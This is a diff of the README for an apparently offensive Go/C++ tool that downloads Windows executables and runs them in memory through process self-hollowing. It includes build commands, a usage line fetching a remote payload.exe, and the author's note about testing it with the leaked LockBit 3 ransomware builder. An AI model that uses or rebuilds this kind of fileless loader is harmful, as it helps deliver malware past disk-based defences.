@@ -1,4 +1,4 @@
-# Go Curl MemExec
+# go http memexec
 
 A lightweight, memory-safe Windows PE file execution tool that downloads and executes payloads without ever touching the disk.
 
@@ -11,9 +11,9 @@ A lightweight, memory-safe Windows PE file execution tool that downloads and exe
 
 ## How It Works
 
-Go Curl MemExec uses a sophisticated process self-hollowing technique to run executables in memory:
+go http memexec uses a sophisticated process self-hollowing technique to run executables in memory:
 
-1. Downloads a PE file directly to memory using curl with stdout redirection
+1. Downloads a PE file directly to memory using golang's net/http
 2. Maps the PE file into memory with proper section permissions
 3. Resolves imports and fixes relocations
 4. Executes the payload by jumping to its entry point
@@ -23,10 +23,10 @@ Go Curl MemExec uses a sophisticated process self-hollowing technique to run exe
 
 ```bash
 # Basic usage with default URL
-./go-curl-memexec
+./go-http-memexec
 
 # Specify a custom download URL
-./go-curl-memexec https://example.com/payload.exe
+./go-http-memexec https://example.com/payload.exe
 ```
 
 ## Use Cases
@@ -40,7 +40,7 @@ Go Curl MemExec uses a sophisticated process self-hollowing technique to run exe
 
 The project combines Go for high-level coordination with C++ for low-level Windows API interaction:
 
-- Uses curl with `-o -` flag to stream downloads directly to memory
+- Uses golang's net/http to stream downloads directly to memory
 - Implements PE parsing, import resolution, and relocation in native code
 - Properly handles TLS callbacks and memory protection
 - Updates the PEB to maintain process coherence after hollowing
@@ -59,7 +59,7 @@ ar rcs librunpe.a selfhollow.o relocate.o
 
 # 2. Build the Go executable
 go mod tidy
-go build -ldflags="-s -w" -o go-curl-memexec.exe
+go build -ldflags="-s -w" -trimpath -o go-http-memexec.exe
 ```
 
 ## Security Considerations
@@ -71,7 +71,7 @@ This tool is designed for legitimate security research, testing, and educational
 - Windows operating system
 - GCC or compatible C++ compiler
 - Go 1.16 or later
-- curl command-line tool accessible in PATH
+
 ## Notes
 - I have only tested this on Windows 10
 - I have only tested with my own statically linked go binary payloads, and the old leaked lockbit3 builder (curl ran + downloaded in memory, and files haflway crypted, but microsoft defender picked it up, as it's 70/70 on VT lol)
